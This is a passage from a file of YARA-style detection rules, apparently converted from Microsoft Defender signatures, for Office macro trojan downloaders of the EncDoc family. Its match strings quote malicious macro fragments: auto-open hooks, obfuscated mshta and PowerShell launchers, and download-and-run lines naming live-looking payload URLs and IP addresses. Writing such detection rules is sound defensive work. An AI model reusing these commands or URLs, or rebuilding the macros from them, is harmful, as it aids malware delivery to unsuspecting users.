        $x_1_1 = {68 74 74 70 3a 2f 2f [0-4] 72 61 68 6f 74 61 62 61 64 6f 6c 2e 63 6f 2e 69 72 2f 73 6e 65 79 76 65 78 76 2f [0-4] 6a 70 67}  //weight: 1, accuracy: Low
        $x_1_2 = "C:\\AutoCadest\\AutoCadest2\\Fiksat.exe" ascii //weight: 1
        $x_1_3 = "C:\\AutoCadest\\AutoCadest2\\Fiksat.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_OKM_2147769214_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.OKM!MTB"
        threat_id = "2147769214"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub auto_open()" ascii //weight: 1
        $x_1_2 = "Dim strMacro As String" ascii //weight: 1
        $x_1_3 = "Sheets(\"Macro1\").Range(\"D122\").Name = \"ok\"" ascii //weight: 1
        $x_1_4 = "Sheets(\"Macro1\").Range(\"D130\") = \"=EXEC(\" + Sheets(\"Macro1\").Range(\"D135\").Value" ascii //weight: 1
        $x_1_5 = "strMacro = \"ok\"" ascii //weight: 1
        $x_1_6 = "Run (strMacro)" ascii //weight: 1
        $x_1_7 = "Set ExcelSheet = Nothing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_OKN_2147769477_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.OKN!MTB"
        threat_id = "2147769477"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub auto_open()" ascii //weight: 1
        $x_1_2 = "Dim strMacro As String" ascii //weight: 1
        $x_1_3 = "Sheets(\"Macro1\").Range(\"D122\").Name = \"ok\"" ascii //weight: 1
        $x_1_4 = "Sheets(\"Macro1\").Range(\"D130\") = \"=EX\" + Aya + \"(\" + Sheets(\"Macro1\").Range(\"D135\").Value" ascii //weight: 1
        $x_1_5 = "strMacro = \"ok\"" ascii //weight: 1
        $x_1_6 = "Run (strMacro)" ascii //weight: 1
        $x_1_7 = "Set ExcelSheet = Nothing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_FIG_2147769854_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.FIG!MTB"
        threat_id = "2147769854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://bhtt.vn/ds/021220.gif" ascii //weight: 1
        $x_1_2 = "http://shopee.gr/ds/021220.gif" ascii //weight: 1
        $x_1_3 = "https://gerrusi.ru/ds/021220.gif" ascii //weight: 1
        $x_1_4 = "https://proco.lt/ds/021220.gif" ascii //weight: 1
        $x_1_5 = "https://lenimar.com/ds/021220.gif" ascii //weight: 1
        $x_1_6 = "chtfj.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QQT_2147769862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QQT!MTB"
        threat_id = "2147769862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/ds/021220.gif" ascii //weight: 1
        $x_1_2 = "C:\\gnbft\\" ascii //weight: 1
        $x_1_3 = "chtfj.dll" ascii //weight: 1
        $x_1_4 = "JJCCJJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DIG_2147769947_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DIG!MTB"
        threat_id = "2147769947"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "/ds/021220&C51" ascii //weight: 1
        $x_1_2 = "chtfj.dll" ascii //weight: 1
        $x_1_3 = {43 3a 5c 67 6e 62 66 74 5c [0-4] 67 69 66}  //weight: 1, accuracy: Low
        $x_1_4 = "JJCCJJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rebrand.ly/WdBPApoMACRO','a.ba" ascii //weight: 1
        $x_1_2 = "powershD" ascii //weight: 1
        $x_1_3 = "lkrglkjgrfjkljgf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dToFileA" ascii //weight: 1
        $x_1_2 = "/5555555555.png" ascii //weight: 1
        $x_1_3 = "explorer0" ascii //weight: 1
        $x_1_4 = "C:\\Droft\\Frots\\ZerioDh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub _" ascii //weight: 1
        $x_1_2 = "Auto_close()" ascii //weight: 1
        $x_1_3 = {44 69 6d 20 [0-9] 20 41 73 20 4e 65 77 20 73 65 78}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 73 65 78 2e [0-32] 2e [0-32] 2e 54 61 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Static Sub auto_open():" ascii //weight: 1
        $x_1_2 = "Calc = _" ascii //weight: 1
        $x_1_3 = "Error.TextBox1" ascii //weight: 1
        $x_1_4 = "= Shell(Calc, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub _" ascii //weight: 1
        $x_1_2 = "Auto_close()" ascii //weight: 1
        $x_1_3 = "Option Explicit" ascii //weight: 1
        $x_1_4 = {53 68 65 6c 6c 20 [0-112] 2e 54 61 67}  //weight: 1, accuracy: Low
        $x_1_5 = "Unload Me" ascii //weight: 1
        $x_1_6 = "Terminate()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rebrand.ly/WdBPApoMACRO" ascii //weight: 1
        $x_1_2 = "powershD" ascii //weight: 1
        $x_1_3 = "https://thephotographersworkflow.com/vv/popi.exe" ascii //weight: 1
        $x_1_4 = "a.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"w\" + \"w\" + \"w\" + \".j.mp/" ascii //weight: 1
        $x_1_2 = "= \"m\" + \"s\" + \"h\" + \"t\" + \"a h" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run(uM5le___i_Cmo9_Fl5, b7EVmQf_RC_M75_Fz)" ascii //weight: 1
        $x_1_2 = "xcvb_ = Chr(sd_ - 62)" ascii //weight: 1
        $x_1_3 = "CreateObject(pc___q_Z_corz" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://1230948%1230948@bitly.com/asddasjisduaiskdhikhasd" ascii //weight: 1
        $x_1_2 = "Run lora2" ascii //weight: 1
        $x_1_3 = "mshta" ascii //weight: 1
        $x_1_4 = "Sub auto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run(XA769OnJIr_7qu, cQ_LLP_l2yVHeb_v)" ascii //weight: 1
        $x_1_2 = "xcvb_ = Chr(sd_ - 62)" ascii //weight: 1
        $x_1_3 = "CreateObject(KL_FZilPKpSSI__Kf_Kg)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub _" ascii //weight: 1
        $x_1_2 = "Auto_close()" ascii //weight: 1
        $x_1_3 = "Option Explicit" ascii //weight: 1
        $x_1_4 = "Shell UserForm2.CloseTheWindow.Tag" ascii //weight: 1
        $x_1_5 = "Unload Me 'UserForm1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "URLDownl\"&CHAR(111)&\"adToFileA" ascii //weight: 1
        $x_1_2 = "ttp://188.127.254.61/89786454657645.exe" ascii //weight: 1
        $x_1_3 = "EXEC(\"C:\\PROGRAMDATA\\a.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "bypass stARt" ascii //weight: 1
        $x_1_2 = {2e 28 27 2e 27 2b 27 2f [0-255] 22 26 43 48 41 52 28 34 36 29 26 22 65 78 65 27 29}  //weight: 1, accuracy: Low
        $x_1_3 = "ttps://tinyurl.com/y2ua6dah" ascii //weight: 1
        $x_1_4 = "cd ${enV`:appdata}" ascii //weight: 1
        $x_1_5 = "('Down'+'loadFile')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "wwqss.Run (xssqwe(" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 54 65 6d 70 22 29 20 2b 20 22 5c [0-10] 2e 62 61 74 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "sStr = sStr + Chr(CLng(\"&H\" & Mid(str, i, 2)) - 9)" ascii //weight: 1
        $x_1_4 = "xssqwe = sStr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "%tmp%\\\\ARDA4PL.jar" ascii //weight: 1
        $x_1_2 = "DownloadFile" ascii //weight: 1
        $x_1_3 = "https://raw.githubusercontent.com/aybiota/mpbh33775/gh-pages/g9wl5dp.ttf\\" ascii //weight: 1
        $x_1_4 = "powershell -command" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Run" ascii //weight: 1
        $x_1_2 = "p://178.17.174.38/f1/ConsoleApp11.ex\" & Chr(101) & Chr(34) & \" -Destination" ascii //weight: 1
        $x_1_3 = {26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-10] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open \"GET\", \"https://zxc.amiralrouter.online/testxxxx.exe\"" ascii //weight: 1
        $x_1_2 = "GetSpecialFolder(2) + \"/serve.exe\"" ascii //weight: 1
        $x_1_3 = ".savetofile TempFile, 2" ascii //weight: 1
        $x_1_4 = "objShell.Run (TempFile)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 78 70 6c 6f 72 65 72 2e 65 78 65 20 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c [0-32] 2e 68 74 61 22}  //weight: 1, accuracy: Low
        $x_1_2 = {27 27 29 2e 72 65 76 65 72 73 65 28 29 2e 6a 6f 69 6e 28 27 27 29 3b 7d [0-32] 20 3d 20 77 69 6e 64}  //weight: 1, accuracy: Low
        $x_1_3 = "Option Explicit" ascii //weight: 1
        $x_1_4 = {53 70 6c 69 74 28 70 28 66 72 6d 2e [0-10] 29 2c 20 22 20 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = " = Replace(" ascii //weight: 1
        $x_1_6 = ".exec p(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(\"\" + \"n\" + \"e\" + \"w\" + \":\" + \"F\" + \"9\" +" ascii //weight: 1
        $x_1_2 = "= \"M\"" ascii //weight: 1
        $x_1_3 = "= \"s\"" ascii //weight: 1
        $x_1_4 = "= \"H\"" ascii //weight: 1
        $x_1_5 = "= \"T\"" ascii //weight: 1
        $x_1_6 = "= \"a\"" ascii //weight: 1
        $x_1_7 = "= \"mp/\"" ascii //weight: 1
        $x_1_8 = "= \"p\"" ascii //weight: 1
        $x_1_9 = "= \"j.\"" ascii //weight: 1
        $x_1_10 = "= \"://\"" ascii //weight: 1
        $x_1_11 = "konhaiyehlog.EXEC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_19
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DllInstall False, ByVal StrPtr(\"http://192.236.147.189/execute/uploads/Excel.sct\") ' False = \"Don't install" ascii //weight: 1
        $x_1_2 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_3 = "unction DllInstall Lib \"scrobj.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_20
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\Test.dll" ascii //weight: 1
        $x_1_2 = "Decode64(IPJ_Status_WSDVA())" ascii //weight: 1
        $x_1_3 = "Create \"regsvr32 /s \" + GetTempPath(), Null, objConfig, intProcessID" ascii //weight: 1
        $x_1_4 = "objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_21
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "hell -w H Start-BitsTransfer -Source \" & Chr(34) & \"http://45.85.90.14/i88/Kpbehmu.ex\" & Chr(101) & Chr(34)" ascii //weight: 1
        $x_1_2 = {2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-34] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = ".exec(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_22
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"m\" + \"s\" + \"h\" + \"t\" + \"a\"" ascii //weight: 1
        $x_1_2 = "= \"h\" + \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"w\" + \"w\" + \"w\" + \".\" + \"j\" + \".\" + \"m\" + \"p\" + \"/\" + \"" ascii //weight: 1
        $x_1_3 = "Call ShellExecute(0&, vbNullString, FileName, _" ascii //weight: 1
        $x_1_4 = "FileNome, vbNullString, vbNormalFocus)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_23
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "dsafjiosdj = \"dfsg  bvxcngf  vxcxvc gfdsg vxcbvcx\"" ascii //weight: 1
        $x_1_2 = "xcvb_(129) & xcvb_(139) & xcvb_(162) & xcvb_(94) & xcvb_(109) & xcvb_(161) & xcvb_(94) & xcvb_(178) & xcvb_(167) & xcvb_(171) & xcvb_(163) & xcvb_(173) & xcvb_(179) & xcvb_(178)" ascii //weight: 1
        $x_1_3 = "fgsdfgb = 45" ascii //weight: 1
        $x_1_4 = ".Run(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_24
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Sub Document_Open()" ascii //weight: 1
        $x_1_2 = ".CreateObject(\"wscript.\" & she & \"l\")" ascii //weight: 1
